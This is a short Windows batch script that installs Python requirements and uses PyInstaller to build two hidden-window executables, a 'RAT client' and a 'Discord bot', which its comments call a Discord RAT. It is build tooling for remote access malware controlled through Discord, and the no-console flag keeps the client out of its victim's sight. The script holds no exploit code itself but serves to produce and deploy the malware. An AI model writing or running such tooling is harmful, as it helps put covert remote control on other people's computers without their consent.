@echo off
rem Build executables for the Discord RAT using PyInstaller

rem Ensure pip is up to date
python -m pip install --upgrade pip

rem Install required packages including PyInstaller
pip install -r requirements.txt
rem Build RAT client executable (no console window)
python -m PyInstaller --onefile --noconsole rat_client.py

rem Build Discord bot executable (no console window)
python -m PyInstaller --onefile --noconsole discord_bot.py


echo Build process completed.
pause